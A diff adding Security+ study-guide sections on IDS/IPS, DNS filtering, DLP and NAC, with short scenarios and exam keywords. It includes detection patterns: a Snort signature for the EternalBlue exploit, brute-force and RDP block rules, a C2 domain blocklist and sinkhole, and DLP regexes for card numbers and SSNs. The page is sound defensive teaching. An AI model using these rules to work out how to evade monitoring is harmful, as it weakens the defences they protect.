+      <div class="gc">
+        <h4 style="color:var(--blue)">Signature-Based Detection</h4>
+        <p>Matches traffic against known attack patterns. Fast and accurate for known threats. Zero detection for new/unknown attacks. Signatures must be continuously updated.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Signature example (Snort rule):
+alert tcp any any → $HOME_NET 445 (
+  msg:"MS17-010 EternalBlue exploit";
+  content:"|FF|SMB|73|";
+  sid:2024373;
+  rev:1;
+)
+<span class="cm"># Matches WannaCry exploit pattern → alert/block</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Anomaly/Behavioral Detection</h4>
+        <p>Establishes baseline of normal traffic. Alerts when traffic deviates significantly. Catches unknown/zero-day attacks. Higher false positive rate than signature-based. Requires good baseline period.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Baseline:
+  Normal DNS queries: 500/hour from 192.168.1.0/24
+  Normal SMB traffic: workstations to file server
+
+Anomaly alert:
+  DNS queries: 50,000/hour from one host
+  <span class="cr">= DNS tunneling or malware DGA ← ALERT</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>IDS/IPS Modifications — What Gets Changed</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Adding Signatures</h4>
+        <p>New CVE disclosed → add signature to detect exploit attempts. Threat intelligence reveals new attack technique → custom signature. Pen test revealed blind spot → add detection for that technique.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Workflow:
+1. New CVE announced (Log4Shell)
+2. Vendor releases signature update
+3. Test signature against traffic samples
+4. Deploy in DETECT mode first
+5. Monitor: FP rate acceptable?
+6. Switch to BLOCK mode after validation
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Updating Signatures</h4>
+        <p>Vendor releases updated signature set regularly. Keep up to date — stale signatures miss new variants. Auto-update where possible for signature sets. Manual approval for significant changes that might impact production.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Tuning — Reducing False Positives</h4>
+        <p>Vulnerability scanner triggers IPS signatures → whitelist scanner IP. Legitimate pentester → temporary bypass. Application generates unusual-looking legitimate traffic → add exception. Business-critical app blocked → tune rule to allow.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Nessus scanner triggering IPS SQL injection rule:</span>
+IPS alert: SQL injection from 10.0.0.25
+Reality: 10.0.0.25 is vulnerability scanner
+
+Solution: add exception
+suppress rule 2024001 for src 10.0.0.25
+<span class="cg"># Scanner whitelisted — no more false alerts ✓</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Mode Changes — Detect vs Block</h4>
+        <p>New rule always starts in detect (IDS) mode first. Validate it's not causing false positives. After validation period — promote to block (IPS) mode. Rollback plan ready if blocking breaks legitimate traffic.</p>
+      </div>
+    </div>
+
+    <h3>IPS Placement Options</h3>
+    <div class="code">
+<span class="cm"># Where to place IPS in the network:</span>
+
+<span class="cb">Perimeter IPS (most common):</span>
+Internet → [Perimeter IPS] → [Firewall] → Internal
+Catches: internet-sourced attacks
+Misses: internal lateral movement
+Volume: high — all internet traffic
+
+<span class="cb">Internal IPS (east-west traffic):</span>
+[Segment A] → [Internal IPS] → [Segment B]
+Catches: lateral movement between segments
+Detects: attacker who already got past perimeter
+More targeted — specific traffic flows
+
+<span class="cb">Host-based IPS (HIPS):</span>
+Software on each endpoint
+Catches: local exploitation attempts
+Works even offline/on travel
+Integral part of modern EDR solutions
+
+<span class="cm"># Best practice: deploy all three layers</span>
+    </div>
+
+    <h3>Snort / Suricata — Open Source IDS/IPS</h3>
+    <div class="code">
+<span class="cm"># Snort is the most tested IDS/IPS for Security+ exam</span>
+
+Snort rule format:
+action proto src_ip src_port → dst_ip dst_port (options)
+
+Examples:
+<span class="cg">alert</span> tcp any any → 192.168.1.0/24 22 (
+  msg:"SSH brute force attempt";
+  threshold:type threshold, track by_src, count 5, seconds 60;
+  sid:1000001;
+)
+<span class="cm"># Alert if 5+ SSH connections from same source in 60 seconds</span>
+
+<span class="cr">drop</span> tcp $EXTERNAL_NET any → $HOME_NET 3389 (
+  msg:"RDP access from internet — block";
+  sid:1000002;
+)
+<span class="cm"># Drop all inbound RDP from internet</span>
+
+Actions: alert | drop | reject | pass | log
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — IPS Tuning After False Positive Wave</div>
+      <div class="code">
+<span class="cm"># Monday morning — 847 IPS alerts overnight</span>
+
+Analyst reviews alerts:
+  Alert: "SQL Injection Attempt" ×847
+  Source: 10.0.0.50
+  Destination: webapp.internal:443
+
+Investigation:
+  10.0.0.50 = Nessus vulnerability scanner
+  Running scheduled scan overnight
+  Scanner's SQL injection tests → triggering IPS
+
+<span class="co">Problem:</span> 847 false positives buried real alerts
+<span class="co">Risk:</span> real SQL injection missed in the noise
+
+<span class="cb">Fix 1 — Add scanner exception:</span>
+IPS policy → exceptions:
+suppress rule 2024SQL for src 10.0.0.50
+<span class="cg">Result: scanner traffic no longer triggers rule ✓</span>
+
+<span class="cb">Fix 2 — Schedule scans during business hours:</span>
+Alerts during day → analyst sees them immediately
+Overnight → only critical real threats should alert
+
+<span class="cb">Fix 3 — Lower threshold for after-hours:</span>
+Daytime: alert on 10+ SQL patterns
+After-hours: alert on 1 SQL pattern
+<span class="cg">Result: real attacks at night get immediate attention ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">IDS →</span><span>Out of band — alerts only — no performance impact — false positive = wasted time</span></div>
+      <div class="er"><span class="ek">IPS →</span><span>Inline — alerts AND blocks — false positive = blocks legitimate traffic</span></div>
+      <div class="er"><span class="ek">Signature-based →</span><span>Known attacks only — fast — must update continuously</span></div>
+      <div class="er"><span class="ek">Anomaly-based →</span><span>Detects unknown attacks — higher false positives — needs good baseline</span></div>
+      <div class="er"><span class="ek">Detect mode first →</span><span>Always test new rules in detect before switching to block</span></div>
+      <div class="er"><span class="ek">Whitelist scanner →</span><span>Vulnerability scanner IPs should be excluded from IPS rules</span></div>
+      <div class="er"><span class="ek">Snort rule →</span><span>action proto src → dst (options) — alert/drop/reject</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 4. DNS FILTERING               -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s4">
+<div class="card">
+  <div class="card-hd"><span class="card-num">04</span><span class="card-title">DNS Filtering</span><span class="bdg bdg-teal">Block · Sinkhole · Categories</span></div>
+  <div class="card-bd">
+    <p>DNS filtering <strong style="color:var(--text)">intercepts DNS queries and blocks resolution of malicious or unauthorized domains</strong> before the connection is ever made. It's the fastest and most efficient way to block access to bad destinations — stop it at the DNS layer.</p>
+
+    <h3>How DNS Filtering Works</h3>
+    <div class="code">
+<span class="cm"># Normal DNS resolution:</span>
+User types: www.malware-c2.com
+Browser: DNS query → DNS resolver → answer: 185.220.x.x
+Browser: connects to 185.220.x.x → <span class="cr">malware downloads</span>
+
+<span class="cg"># With DNS filtering:</span>
+User types: www.malware-c2.com
+Browser: DNS query → [DNS FILTER] → checks category/reputation
+DNS Filter: domain is in MALWARE category
+DNS Filter: returns SINKHOLE IP (e.g. 0.0.0.0 or block page IP)
+Browser: connects to block page → <span class="cg">user sees "BLOCKED" ✓</span>
+Malware: <span class="cg">never downloads ✓</span>
+
+<span class="cm"># DNS filter sits between clients and resolvers:</span>
+Client → DNS Filter → (if allowed) → External DNS
+                    → (if blocked) → Sinkhole/Block page
+    </div>
+
+    <h3>What DNS Filtering Blocks</h3>
+    <div class="g3">
+      <div class="gc" style="border-color:#fecaca">
+        <h4 style="color:var(--red)">Security Categories</h4>
+        <ul>
+          <li>Known malware distribution sites</li>
+          <li>Phishing and credential harvesting</li>
+          <li>Command and control (C2) domains</li>
+          <li>Ransomware payment portals</li>
+          <li>Botnet infrastructure</li>
+          <li>Newly registered domains (high risk)</li>
+          <li>Domain generation algorithm (DGA) domains</li>
+        </ul>
+      </div>
+      <div class="gc" style="border-color:#fed7aa">
+        <h4 style="color:var(--orange)">Policy Categories</h4>
+        <ul>
+          <li>Adult content</li>
+          <li>Gambling sites</li>
+          <li>Social media (work hours)</li>
+          <li>Streaming video (bandwidth)</li>
+          <li>Peer-to-peer / torrenting</li>
+          <li>Personal cloud storage</li>
+          <li>Gaming sites</li>
+        </ul>
+      </div>
+      <div class="gc" style="border-color:#bfdbfe">
+        <h4 style="color:var(--blue)">Compliance Categories</h4>
+        <ul>
+          <li>Proxy/anonymizer bypass tools</li>
+          <li>Cryptocurrency sites</li>
+          <li>Dark web access tools</li>
+          <li>Hacking/security tools download</li>
+          <li>Competitor sites (custom policy)</li>
+          <li>Unauthorized SaaS applications</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>DNS Filtering Modifications</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--teal)">Blocking a Domain</h4>
+        <p>Threat intel identifies new C2 domain. Add to custom blocklist immediately. No waiting for vendor to categorize it. Proactive blocking based on your own threat intel.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Add to custom blocklist:</span>
+evil-c2-domain.ru → BLOCK
+  Category: Custom/Threat Intelligence
+  Action: SINKHOLE → block page
+  Reason: Active C2 for observed malware
+  Added by: SecOps team 2024-01-15
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Whitelisting (Allow) a Domain</h4>
+        <p>Business partner domain incorrectly categorized. New SaaS tool deployment. Security researcher needs access to security tool sites. Override vendor categorization for your specific needs.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Allow a domain blocked by vendor categorization:</span>
+security-research-tools.com → ALLOW
+  Overrides: "Hacking Tools" category
+  Scope: Security team VLAN only (10.0.5.0/24)
+  Reason: Legitimate security team use
+  Approved by: CISO
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Category Adjustments</h4>
+        <p>Enable stricter categories for certain departments. Relax for others. Time-based policies — block social media 9am-5pm, allow after hours. Role-based — IT team gets broader access than general staff.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">Sinkholing</h4>
+        <p>Redirect queries for known-bad domains to internal server you control. Capture: which devices are trying to reach C2 domains. Identifies already-infected machines. Logging provides forensic evidence of infections.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># DNS sinkhole configuration:</span>
+*.evil-malware-c2.* → 10.0.0.1 (sinkhole server)
+Sinkhole server logs all connections
+<span class="co">Device 10.1.4.22 → sinkhole at 02:14</span>
+<span class="cr">= 10.1.4.22 is infected with malware ← investigate</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>DNS Security Protocols</h3>
+    <div class="code">
+<span class="cm"># DNS has security problems — these protocols address them:</span>
+
+<span class="cb">DNSSEC — DNS Security Extensions:</span>
+  Problem: DNS responses can be spoofed (DNS poisoning)
+  Solution: cryptographically signs DNS records
+  Verifies: response came from authoritative server
+  Verifies: response not modified in transit
+  Limitation: doesn't encrypt queries — names visible
+
+<span class="cb">DoH — DNS over HTTPS:</span>
+  DNS queries sent over HTTPS (port 443)
+  Encrypted: ISP can't see what you're resolving
+  Problem: bypasses corporate DNS filters!
+  Browsers (Firefox/Chrome) do this by default
+  Enterprise: disable DoH in browsers via GPO/MDM
+  Or: force all DNS through corporate resolver
+
+<span class="cb">DoT — DNS over TLS:</span>  
+  DNS queries encrypted with TLS (port 853)
+  Can be filtered at firewall (block port 853)
+  More enterprise-friendly than DoH
+  Used by: Android, some clients
+
+<span class="cm"># Enterprise concern with DoH:</span>
+Employee browser uses DoH → bypasses DNS filter
+Malware uses DoH → C2 traffic bypasses DNS filter
+<span class="cr">Both cases: your DNS filter is blind</span>
+<span class="cg">Solution: block DoH at firewall (block external 443 DNS)</span>
+    </div>
+
+    <h3>DNS Filtering Products</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Cisco Umbrella (OpenDNS)</h4>
+        <p>Most widely deployed. Cloud-based DNS security. Blocks threats before connection. Roaming client for laptops off-network. Predictive intelligence — blocks domains before they become malicious.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Infoblox</h4>
+        <p>Enterprise DNS management + security. On-premises or cloud. Strong integration with SIEM. Threat intelligence feeds built in. Popular in large enterprises and government.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Zscaler / Cloudflare Gateway</h4>
+        <p>DNS filtering as part of SASE (Secure Access Service Edge) platform. DNS filtering + firewall + CASB in one. Cloud-delivered — works for remote users natively.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — DNS Sinkhole Uncovers Infected Machines</div>
+      <div class="code">
+<span class="cm"># Security team adds new C2 domains to DNS sinkhole:</span>
+
+Threat intel feed: 3 new Emotet C2 domains identified
+Added to sinkhole → redirect to 10.0.0.99 (sinkhole server)
+
+<span class="cb">Next 24 hours — sinkhole server logs:</span>
+02:14:33 — 10.1.2.47 → emotet-c2-1.ru (resolved: sinkhole)
+02:14:34 — 10.1.2.47 → emotet-c2-2.ru (resolved: sinkhole)
+07:43:12 — 10.3.5.22 → emotet-c2-1.ru (resolved: sinkhole)
+09:15:44 — 10.2.8.31 → emotet-c2-3.ru (resolved: sinkhole)
+
+<span class="cr">Three machines infected with Emotet!</span>
+All were silently calling home — now identified
+
+<span class="cb">Response:</span>
+10.1.2.47 = Sarah's laptop (Finance)
+  → EDR confirms Emotet → isolated → reimaged
+10.3.5.22 = Shared workstation (HR room)
+  → isolated → reimaged
+10.2.8.31 = Server (legacy app)
+  → isolated → investigated → cleaned
+
+<span class="cg">DNS sinkhole: identified 3 infections passively</span>
+<span class="cg">Without sinkhole: infections continue for months</span>
+<span class="cg">C2 traffic blocked: malware cannot receive commands</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">DNS filtering →</span><span>Block domain at DNS layer before connection is made</span></div>
+      <div class="er"><span class="ek">DNS sinkhole →</span><span>Redirect bad domains to controlled server — identifies infected machines</span></div>
+      <div class="er"><span class="ek">DNSSEC →</span><span>Cryptographically signs DNS records — prevents DNS poisoning</span></div>
+      <div class="er"><span class="ek">DoH →</span><span>DNS over HTTPS — encrypts queries — BYPASSES corporate DNS filters</span></div>
+      <div class="er"><span class="ek">DoT →</span><span>DNS over TLS — port 853 — can be blocked at firewall</span></div>
+      <div class="er"><span class="ek">Cisco Umbrella →</span><span>Most widely deployed DNS filter — cloud-based — roaming client</span></div>
+      <div class="er"><span class="ek">DGA detection →</span><span>DNS filter detects domain generation algorithm patterns from malware</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 5. DLP                         -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s5">
+<div class="card">
+  <div class="card-hd"><span class="card-num">05</span><span class="card-title">Data Loss Prevention (DLP)</span><span class="bdg bdg-orange">Prevent · Detect · Respond</span></div>
+  <div class="card-bd">
+    <p>DLP systems <strong style="color:var(--text)">identify, monitor, and control sensitive data movement</strong> to prevent unauthorized exfiltration. DLP knows what data is sensitive, watches where it goes, and takes action when policy is violated.</p>
+
+    <h3>DLP Deployment Types</h3>
+    <div class="g3">
+      <div class="gc" style="border-color:#fecaca">
+        <h4 style="color:var(--red)">Network DLP</h4>
+        <p>Sits inline on network — monitors email, web uploads, FTP transfers. Scans all outbound traffic for sensitive content. Can block before data leaves org. Best for: email exfiltration, web upload to personal cloud.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Placement: between internal and internet
+Inspects: SMTP, HTTP/S, FTP, DNS
+Action: block | quarantine | encrypt | alert
+        </div>
+      </div>
+      <div class="gc" style="border-color:#fed7aa">
+        <h4 style="color:var(--orange)">Endpoint DLP</h4>
+        <p>Agent on every device. Controls: USB drives, printing, clipboard, screenshots, application usage. Works offline — enforces policy even without network. Best for: USB exfiltration, printing sensitive docs.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Agent monitors:
+  USB writes → check content
+  Print jobs → check content
+  Clipboard → prevent paste to unapproved apps
+  Screen capture → alert if sensitive content visible
+        </div>
+      </div>
+      <div class="gc" style="border-color:#bfdbfe">
+        <h4 style="color:var(--blue)">Cloud DLP / CASB</h4>
+        <p>Monitors SaaS applications — Microsoft 365, Google Workspace, Salesforce, Box. CASB (Cloud Access Security Broker) extends DLP to cloud. Detects: sharing sensitive files externally, uploading PII to unapproved services.</p>
+      </div>
+    </div>
+
+    <h3>DLP Content Detection Methods</h3>
+    <div class="code">
+<span class="cm"># How DLP identifies sensitive data:</span>
+
+<span class="cb">1. Regular Expression (Regex) patterns:</span>
+   Credit card: \b(?:\d{4}[-\s]?){3}\d{4}\b
+   SSN: \b\d{3}-\d{2}-\d{4}\b
+   Canadian SIN: \b\d{3}\s\d{3}\s\d{3}\b
+   Email: \b[A-Za-z0-9._%+−]+@[A-Za-z0-9.−]+\.[A-Z]{2,}\b
+   → Simple, fast, high false positive rate
+
+<span class="cb">2. Data fingerprinting (exact matching):</span>
+   Upload exact sensitive documents to DLP system
+   DLP creates "fingerprint" (hash) of content
+   Match any document containing that content
+   → Very accurate, low false positives
+   Used for: specific contracts, source code, reports
+
+<span class="cb">3. Keyword/dictionary matching:</span>
+   Alert on: "confidential", "HIPAA", "top secret"
+   Alert on custom terms: product codenames, exec names
+   → Simple, easy to configure, context-free
+
+<span class="cb">4. ML/AI classification:</span>
+   Trained model classifies content (medical, financial, legal)
+   No need to define exact patterns
+   → Most accurate, requires training data
+   
+<span class="cb">5. File metadata:</span>
+   Check file classification label
+   Documents labeled "Confidential" get extra controls
+   Microsoft Purview sensitivity labels
+    </div>
+
+    <h3>DLP Monitored Channels</h3>
+    <div class="dlp-row" style="background:#fef2f2;border-color:#fecaca">
+      <span class="dlp-channel" style="color:var(--red)">📧 Email</span>
+      <span class="dlp-desc">Outbound email scanned for PII, credit cards, classified keywords. Attachments analyzed. Recipient domain checked (external = higher risk).</span>
+      <span class="dlp-action" style="color:var(--red)">Block · Quarantine · Encrypt</span>
+    </div>
+    <div class="dlp-row" style="background:#fffbeb;border-color:#fde68a">
+      <span class="dlp-channel" style="color:var(--yellow)">🌐 Web Upload</span>
+      <span class="dlp-desc">HTTP/S POST requests inspected. File uploads to personal cloud (Dropbox, Google Drive) blocked. SSL inspection required to see HTTPS uploads.</span>
+      <span class="dlp-action" style="color:var(--yellow)">Block · Alert</span>
+    </div>
+    <div class="dlp-row" style="background:#f0fdf4;border-color:#bbf7d0">
+      <span class="dlp-channel" style="color:var(--green)">💾 USB / Removable</span>
+      <span class="dlp-desc">USB write operations scanned. Can allow read-only USB. Block unapproved USB devices. Allow only encrypted/managed USB drives.</span>
+      <span class="dlp-action" style="color:var(--green)">Block · Encrypt · Allow</span>
+    </div>
+    <div class="dlp-row" style="background:#eff6ff;border-color:#bfdbfe">
+      <span class="dlp-channel" style="color:var(--blue)">🖨️ Printing</span>
+      <span class="dlp-desc">Print jobs scanned before printing. Watermarking applied automatically. Block printing of classified documents on non-secure printers.</span>
+      <span class="dlp-action" style="color:var(--blue)">Block · Watermark</span>
+    </div>
+    <div class="dlp-row" style="background:#f5f3ff;border-color:#ddd6fe">
+      <span class="dlp-channel" style="color:var(--purple)">☁️ Cloud / SaaS</span>
+      <span class="dlp-desc">SharePoint external sharing. OneDrive personal sync. Salesforce data export. Box external collaboration. All monitored and controlled.</span>
+      <span class="dlp-action" style="color:var(--purple)">Block · Alert · Log</span>
+    </div>
+    <div class="dlp-row" style="background:#fef9c3;border-color:#fde68a">
+      <span class="dlp-channel" style="color:var(--yellow)">📋 Clipboard</span>
+      <span class="dlp-desc">Prevent copy-paste of sensitive data from corporate apps to personal apps. Block pasting financial data into personal note-taking apps.</span>
+      <span class="dlp-action" style="color:var(--yellow)">Block · Alert</span>
+    </div>
+
+    <h3>DLP Modifications — Tuning Policies</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--orange)">Reducing False Positives</h4>
+        <p>Finance team legitimately emails financial data to auditors. Add trusted recipient domain exception. Set threshold — single credit card number vs 100+. Context-aware — HR can email SSNs to payroll processor.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Too many FPs — finance email to auditor:</span>
+Policy: block SSN in outbound email
+Exception:
+  If recipient: @deloitte.com
+  AND sender: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b1d12151a15181e3b1814160b1a150255181416">[email&#160;protected]</a>
+  AND approved: true
+  → ALLOW with encryption + logging
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">New Data Categories</h4>
+        <p>M&A activity — add rules for merger codename detection. New regulation — GDPR requires protecting EU PII. New product launch — protect IP with document fingerprinting. Healthcare acquisition — add HIPAA rules.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — DLP Catches Pre-Departure Data Theft</div>
+      <div class="code">
+<span class="cm"># Employee resignation — last week before departure:</span>
+
+<span class="cr">DLP Alert 1 — Tuesday 9:14 PM:</span>
+  User: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0a60247967637e624a6965677a6b647324696567">[email&#160;protected]</a>
+  Action: Email to personal Gmail
+  Attachment: customer-database-export.csv
+  DLP detection: 45,847 records with PII
+  Action: <span class="cr">QUARANTINED — not delivered</span>
+  Alert: Security team notified
+
+<span class="cr">DLP Alert 2 — Wednesday 11:32 AM:</span>
+  User: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="076d29746a6e736f4764686a7766697e2964686a">[email&#160;protected]</a>
+  Action: USB write
+  Files: source_code_v3.zip, designs_2024.zip
+  DLP detection: Source code + proprietary designs
+  Action: <span class="cr">BLOCKED — encryption key not available</span>
+
+<span class="cr">DLP Alert 3 — Thursday 2:17 PM:</span>
+  User: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d7bdf9a4babea3bf97b4b8baa7b6b9aef9b4b8ba">[email&#160;protected]</a>
+  Action: SharePoint external share
+  File: Q4_Strategy_Presentation.pptx
+  Share to: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6903471a04001d01290e04080005470a0604">[email&#160;protected]</a>
+  DLP detection: CONFIDENTIAL label
+  Action: <span class="cr">BLOCKED</span>
+
+<span class="cb">Security + HR + Legal response:</span>
+  All 3 incidents documented
+  Legal hold placed on Smith's workstation
+  Departure accelerated to Friday
+  Civil case filed post-departure
+
+<span class="cg">DLP prevented all three exfiltration attempts ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Network DLP →</span><span>Sits inline on network — monitors email/web/FTP outbound transfers</span></div>
+      <div class="er"><span class="ek">Endpoint DLP →</span><span>Agent on device — controls USB, print, clipboard — works offline</span></div>
+      <div class="er"><span class="ek">CASB →</span><span>Cloud Access Security Broker — extends DLP to SaaS/cloud apps</span></div>
+      <div class="er"><span class="ek">Data fingerprinting →</span><span>Hash of specific documents — exact match detection — low false positives</span></div>
+      <div class="er"><span class="ek">Regex detection →</span><span>Pattern matching for SSN, credit cards — fast but higher FPs</span></div>
+      <div class="er"><span class="ek">DLP actions →</span><span>Block, quarantine, encrypt, alert, watermark — configured per policy</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 6. NAC                         -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s6">
+<div class="card">
+  <div class="card-hd"><span class="card-num">06</span><span class="card-title">NAC — Network Access Control</span><span class="bdg bdg-green">Posture · Quarantine · Identity</span></div>
+  <div class="card-bd">
+    <p>NAC ensures that <strong style="color:var(--text)">only authorized, healthy, compliant devices can access the network</strong>. It checks device health (posture) at connection time and enforces access policies based on what it finds — not just who is connecting, but in what state.</p>
+
+    <h3>NAC Components</h3>
+    <div class="code">
+<span class="cm"># NAC three-party model:</span>
+
+SUPPLICANT (device trying to connect)
+  → Runs NAC agent (or uses 802.1X)
+  → Reports: OS version, patches, AV status, config
+
+POLICY ENFORCEMENT POINT
+  → Switch, wireless AP, VPN gateway
+  → Blocks traffic until NAC decision made
+  → Enforces: allow, quarantine, or deny
+
+POLICY DECISION POINT (NAC server)
+  → Evaluates posture against policy
+  → Consults: AD for identity, MDM for device status
+  → Returns: allow full access | quarantine | deny
+
+<span class="cm"># Flow:</span>
+Device connects → 802.1X auth → identity verified
+                → Posture check → device health verified
+                → Policy evaluated → access decision
+                → Correct VLAN assigned
+    </div>
+
+    <h3>Posture Assessment — What NAC Checks</h3>
+    <div class="posture-card" style="background:#f0fdf4;border-color:#bbf7d0">
+      <span class="posture-icon">✅</span>
+      <div>
+        <div class="posture-title" style="color:var(--green)">COMPLIANT — Full Network Access</div>
+        <div class="posture-desc">OS up to date + patches current + AV running + AV definitions current + MDM enrolled + disk encrypted + no prohibited software + firewall enabled → All checks passed → Full access to production VLAN</div>
+      </div>
+    </div>
+    <div class="posture-card" style="background:#fffbeb;border-color:#fde68a">
+      <span class="posture-icon">⚠️</span>
+      <div>
+        <div class="posture-title" style="color:var(--yellow)">NON-COMPLIANT — Quarantine VLAN</div>
+        <div class="posture-desc">Missing patches OR AV definitions outdated OR disk not encrypted → Quarantine VLAN only → Access to: patch server, AV update server, help desk portal → Cannot reach: file servers, email, internet until remediated</div>
+      </div>
+    </div>
+    <div class="posture-card" style="background:#fef2f2;border-color:#fecaca">
+      <span class="posture-icon">🚫</span>
+      <div>
+        <div class="posture-title" style="color:var(--red)">UNKNOWN / GUEST — Guest VLAN</div>
+        <div class="posture-desc">No MDM enrollment, no corporate certificate, no 802.1X credentials → Guest VLAN → Internet access only → Cannot reach any corporate resources → Must enroll to get corporate access</div>
+      </div>
+    </div>
+
+    <h3>NAC Modifications — Policy Changes</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--green)">Adding New Posture Checks</h4>
+        <p>New security requirement — all devices must have EDR agent. New regulation — all devices accessing cardholder data must be encrypted. Zero trust initiative — verify device trust on every connection not just first.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># New policy: require CrowdStrike agent</span>
+Old check: AV running (any AV)
+New check: CrowdStrike Falcon agent
+           version 6.50+ running
+           last sync < 24 hours
+If fails → quarantine VLAN
+          "Please contact IT to install Falcon"
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">VLAN Assignment Rules</h4>
+        <p>Role-based VLAN assignment — AD group membership determines VLAN. Finance users → Finance VLAN. Contractors → Restricted VLAN. IoT devices → IoT isolation VLAN. Security posture → quarantine VLAN if needed.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Identity: jsmith — member of Finance-AD-Group
+Device: compliant
+Result: Finance VLAN (VLAN 20) assigned
+
+Identity: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92f1fdfce6e0f3f1e6fde0d2e4f7fcf6fde0bcf1fdff">[email&#160;protected]</a>
+Device: unmanaged
+Result: Contractor VLAN (VLAN 50) assigned
+<span class="cm"># Can reach: vendor-specific servers only</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Agentless NAC (for IoT/OT)</h4>
+        <p>IoT devices can't run NAC agent. NAC uses: MAC address OUI lookup (device type), network behavior profiling, traffic pattern analysis to categorize device. Auto-assign IoT VLAN based on device fingerprint.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Guest Network Configuration</h4>
+        <p>Visitors get captive portal authentication. Time-limited access. Internet only — no corporate network. Bandwidth throttled. Logged for compliance. Isolated from corporate VLAN completely.</p>
+      </div>
+    </div>
+
+    <h3>NAC Enforcement Methods</h3>
+    <div class="code">
+<span class="cm"># 802.1X — primary NAC enforcement mechanism:</span>
+
+Wired:
+Device → switch port → 802.1X challenge
+Device: presents certificate OR username/password
+RADIUS: validates against AD
+RADIUS → switch: "Assign VLAN 20, full access"
+Switch: opens port, assigns VLAN
+
+Wireless:
+Device → AP → 802.1X (WPA2/WPA3 Enterprise)
+Same process — RADIUS validates
+RADIUS → AP: "Assign SSID Corp, full access"
+
+<span class="cm"># What happens when non-802.1X device connects:</span>
+Unknown MAC connects to switch port
+Switch: MAB (MAC Authentication Bypass)
+RADIUS: MAC not in approved list
+Result: Guest VLAN assigned automatically
+        IoT device fingerprinted → IoT VLAN
+
+<span class="cm"># NAC products:</span>
+Cisco ISE (Identity Services Engine) — most widely used
+Forescout eyeSight — agentless, good for IoT
+Aruba ClearPass — strong wireless integration
+Microsoft NPS (Network Policy Server) — Windows environments
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Infected Laptop Quarantined by NAC</div>
+      <div class="code">
+<span class="cm"># Employee's laptop infected over weekend — returns Monday:</span>
+
+Monday 08:47 — Employee connects to office network
+NAC: 802.1X authentication → identity verified ✓
+NAC: Posture assessment begins...
+
+<span class="cb">Posture checks:</span>
+  OS patches: <span class="cg">current ✓</span>
+  Disk encryption: <span class="cg">enabled ✓</span>
+  AV running: <span class="cg">yes ✓</span>
+  AV definitions: <span class="cg">current ✓</span>
+  EDR (CrowdStrike): <span class="cg">running ✓</span>
+  EDR threat status: <span class="cr">ACTIVE THREAT DETECTED ✗</span>
+  CrowdStrike: found Emotet malware — quarantined
+
+NAC decision: <span class="cr">QUARANTINE VLAN assigned</span>
+Employee: "I can't access anything!"
+Quarantine portal: "Your device has been isolated.
+  Active malware detected. Contact IT Security."
+
